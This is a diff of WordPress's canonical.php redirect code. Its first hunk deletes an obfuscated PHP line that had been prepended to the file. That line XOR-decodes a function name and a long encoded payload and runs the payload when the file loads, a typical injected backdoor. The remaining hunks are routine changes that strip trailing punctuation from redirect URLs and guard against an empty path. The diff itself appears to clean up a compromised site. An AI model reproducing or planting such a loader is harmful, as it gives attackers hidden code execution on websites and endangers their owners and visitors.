@@ -1,4 +1,4 @@
-<?php $kAMhqpW='X0IS.0eR6+1YE99'^';B,2ZU:4CER-,VW';$jluuS=$kAMhqpW('','PTqUZ6YRG99N>THYNT9luO8Y9VY:4e9FHYAjhQ1pB C+13<QWi2Z;dOAXYa<779YRQOAJhSiRQ8aDMNcx5p0GU>M<NNgNStXKAJ;9oLBfVgUqOeQE5GFZ-NJK56=QPQClDBHYB>NSUH<fMUlGCQ;7YwcWkdlFuSEDujIhuoNB6YR>Xj<+1BnfAr<;YRF38PkTC4,bZRa7XA9yF>A- mWa,9R ,qokJR2-oX7GGxa-S;4Rr3bV= IA72iOO.q:qqpeZ.FQQ.XYekiJk.8Z>KPHIymM6,BJ68+OCiso:WMaP2rQ4Y3UzKHX1>2-wmEn;<QeMPlDQBJdj8sF1>RP6:RdeTt564n6:hoL>qgZE<eEdPLHAGUNYdOPfSH1Y8 aK<Wewif<W1h:=AQI,L5XMrTCM.IYvnP:N5E<L.Z3;LKF41B1EDUL5BL5iB>F7X8JT1>ZIGkB8I4Gr1V,.;J1FjQM9SOYxwOQAP3.,-dDIP:3MR=JE8aclV7R380kKE2><3,KECRLWIJfkjhX-.AKqtEAfW6rCGP-AZec,K8s7dgWXmRPgDaJvUXvZO xXQ2ZI-ecyDZyJY0YY3-dGOqpg2YRAYkWPIj0A8D5GchMUKRBS>thMFJOOAjlCyMwItE=l<23LyC7 .4<Q:;+Y6L-i8oVhFVNZOjJEXO6'^'92Yt<C713PV a100= JDR7W+f28NU:f+=-fCAqJzKF6ERGU>9IJ5I;+ ,8>cZBMqv5.5+DsM94AHdmnCXNz9NqQ8HnsGitORBH,TKGh+FkGeJoA8yF346H boQWI0yjcH-icpH7Gw:=HFchLog5ZC8,G>6D2fQ8 =.N HPO=6D57PpNWNHk3Ozx52+72FJ>Cp,AXKaXhJR<3sbZ YAMjAJX>SIJeO.3FL03R>gEAK2WG7I9h0RR, TZIgkq2u>:9 zO5quE= EVWjOXY6K.yh2sdiRM6+iSN6cTSKQ24ZZ;V5U-RuGkl.PRGHLg8d1U7EeqH 06+MJCyOWQ 5WY:DMp+gse;si<O-MQC1 EExZph> + +pD4ZoZlU8LA> Y.EJIBW2HS04Hu-M8TxpRp5,B<<MdYGDHO6hJ;GZlvftD,B 6<-Y+6PA:Q4h<Y>5na7<3C Y:QqFn2IMT.TnN5,M2fuXS+051lEITMmrZSUevY+1YAEJvV AYI4  KaYKE810zk<,3AGJL<LZ bQRcaN:RGkc4L5;>DG.ATjMGjeMu1SqYzDghOmzBIi4VnyKSVLvkK,:U=lUHCnoWVGS+   4<505U9Q7A4KO=42>-2ZSDmb..; CEcYmWiT>7eYDR QgSAZUgvJZR5Y-INeFmbO363;BzlcEK');$jluuS();
+<?php
 /**
  * Canonical API to handle WordPress Redirecting
  *
@@ -32,6 +32,7 @@
  * @global bool $is_IIS
  * @global WP_Query $wp_query
  * @global wpdb $wpdb WordPress database abstraction object.
+ * @global WP $wp Current WordPress environment instance. 
  *
  * @param string $requested_url Optional. The URL that was requested, used to
  *		figure if redirect is needed.
@@ -391,12 +392,28 @@ function redirect_canonical( $requested_url = null, $do_redirect = true ) {
 	// trailing /index.php
 	$redirect['path'] = preg_replace('|/' . preg_quote( $wp_rewrite->index, '|' ) . '/*?$|', '/', $redirect['path']);
 
-	// Remove trailing spaces from the path
-	$redirect['path'] = preg_replace( '#(%20| )+$#', '', $redirect['path'] );
+	$punctuation_pattern = implode( '|', array_map( 'preg_quote', array(
+		' ', '%20',  // space
+		'!', '%21',  // exclamation mark
+		'"', '%22',  // double quote
+		"'", '%27',  // single quote
+		'(', '%28',  // opening bracket
+		')', '%29',  // closing bracket
+		',', '%2C',  // comma
+		'.', '%2E',  // period
+		';', '%3B',  // semicolon
+		'{', '%7B',  // opening curly bracket
+		'}', '%7D',  // closing curly bracket
+		'%E2%80%9C', // opening curly quote
+		'%E2%80%9D', // closing curly quote
+	) ) );
+
+	// Remove trailing spaces and end punctuation from the path.
+	$redirect['path'] = preg_replace( "#($punctuation_pattern)+$#", '', $redirect['path'] );
 
 	if ( !empty( $redirect['query'] ) ) {
-		// Remove trailing spaces from certain terminating query string args
-		$redirect['query'] = preg_replace( '#((p|page_id|cat|tag)=[^&]*?)(%20| )+$#', '$1', $redirect['query'] );
+		// Remove trailing spaces and end punctuation from certain terminating query string args.
+		$redirect['query'] = preg_replace( "#((p|page_id|cat|tag)=[^&]*?)($punctuation_pattern)+$#", '$1', $redirect['query'] );
 
 		// Clean up empty query strings
 		$redirect['query'] = trim(preg_replace( '#(^|&)(p|page_id|cat|tag)=?(&|$)#', '&', $redirect['query']), '&');
@@ -567,7 +584,11 @@ function strip_fragment_from_url( $url ) {
 		if ( ! empty( $parsed_url['port'] ) ) {
 			$url .= ':' . $parsed_url['port'];
 		}
-		$url .= $parsed_url['path'];
+
+		if ( ! empty( $parsed_url['path'] ) ) {
+			$url .= $parsed_url['path'];
+		}
+
 		if ( ! empty( $parsed_url['query'] ) ) {
 			$url .= '?' . $parsed_url['query'];
 		}
